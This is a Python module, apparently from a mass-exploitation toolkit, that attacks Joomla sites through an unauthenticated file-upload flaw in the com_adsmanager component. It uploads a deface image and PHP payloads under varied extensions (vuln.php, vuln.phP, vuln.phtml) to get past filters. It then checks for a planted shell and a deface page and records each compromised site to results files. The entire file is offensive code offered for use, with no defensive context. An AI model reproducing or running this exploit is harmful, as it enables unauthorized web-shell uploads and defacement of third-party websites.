
import requests, re
import printModule
r = '\033[31m'
g = '\033[32m'
y = '\033[33m'
b = '\033[34m'
m = '\033[35m'
c = '\033[36m'
w = '\033[37m'
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
indeX = 'files/index.jpg'
Jce_Deface_image = 'files/pwn.gif'


def com_adsmanager_index(site):
    try:
        fileindex = {'file': open(Jce_Deface_image, 'rb')}
        post_data = {"name": Jce_Deface_image.split('/')[1],
                     "submit": "Upload"}
        Exp = 'http://' + site + "/index.php?option=com_adsmanager&task=upload&tmpl=component"
        GoT = requests.post(Exp, files=fileindex, data=post_data, timeout=10, headers=Headers)
        if '"jsonrpc"' in str(GoT.content):
            Check = requests.get('http://' + site + '/tmp/plupload/' + Jce_Deface_image.split('/')[1],
                                 timeout=10, headers=Headers)
            if 'GIF89a' in str(Check.content):
                with open('result/Index_results.txt', 'a') as writer:
                    writer.write(site + '/tmp/plupload/' + Jce_Deface_image.split('/')[1] + '\n')
                return printModule.returnYes(site, 'N/A', 'Com_adsmanager', 'Joomla')
            else:
                return printModule.returnNo(site, 'N/A', 'Com_adsmanager', 'Joomla')
        else:
            return printModule.returnNo(site, 'N/A', 'Com_adsmanager', 'Joomla')
    except:
        return printModule.returnNo(site, 'N/A', 'Com_adsmanager', 'Joomla')


def Exploit(site):
    try:
        fileindex = {'file': open(indeX, 'rb')}
        post_data = {"name": "vuln.php",
                     "submit": "Upload"}
        Exp = 'http://' + site + "/index.php?option=com_adsmanager&task=upload&tmpl=component"
        GoT = requests.post(Exp, files=fileindex, data=post_data, timeout=10, headers=Headers)
        if '"jsonrpc"' in str(GoT.content):
            requests.post(Exp, files=fileindex, data={"name": "vuln.phP"}, timeout=10, headers=Headers)
            requests.post(Exp, files=fileindex, data={"name": "vuln.phtml"}, timeout=10, headers=Headers)
            Check = requests.get('http://' + site + '/tmp/plupload/vuln.php', timeout=10, headers=Headers)
            Check2 = requests.get('http://' + site + '/tmp/plupload/vuln.phP', timeout=10, headers=Headers)
            Check3 = requests.get('http://' + site + '/tmp/plupload/vuln.phtml', timeout=10, headers=Headers)
            CheckIndex = requests.get('http://' + site + '/vuln.htm', timeout=10, headers=Headers)
            CheckShell = requests.get('http://' + site + '/images/vuln.php', timeout=10, headers=Headers)

            if 'Vuln!!' in str(Check.content):
                if 'Vuln!!' in str(CheckShell.content):
                    with open('result/Shell_results.txt', 'a') as writer:
                        writer.write(site + '/images/vuln.php' + '\n')
                if 'Vuln!!' in str(CheckIndex.content):
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(site + '/vuln.htm' + '\n')
                    return printModule.returnYes(site, 'N/A', 'Com_adsmanager', 'Joomla')
                else:
                    com_adsmanager_index(site)
            elif 'Vuln!!' in str(Check2.content):
                if 'Vuln!!' in str(CheckShell.content):
                    with open('result/Shell_results.txt', 'a') as writer:
                        writer.write(site + '/images/vuln.php' + '\n')
                if 'Vuln!!' in str(CheckIndex.content):
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(site + '/vuln.htm' + '\n')
                    return printModule.returnYes(site, 'N/A', 'Com_adsmanager', 'Joomla')
                else:
                    com_adsmanager_index(site)
            elif 'Vuln!!' in str(Check3.content):
                if 'Vuln!!' in str(CheckShell.content):
                    with open('result/Shell_results.txt', 'a') as writer:
                        writer.write(site + '/images/vuln.php' + '\n')
                if 'Vuln!!' in str(CheckIndex.content):
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(site + '/vuln.htm' + '\n')
                    return printModule.returnYes(site, 'N/A', 'Com_adsmanager', 'Joomla')
                else:
                    return com_adsmanager_index(site)
            else:
                return com_adsmanager_index(site)
        else:
            return com_adsmanager_index(site)
    except:
        return com_adsmanager_index(site)
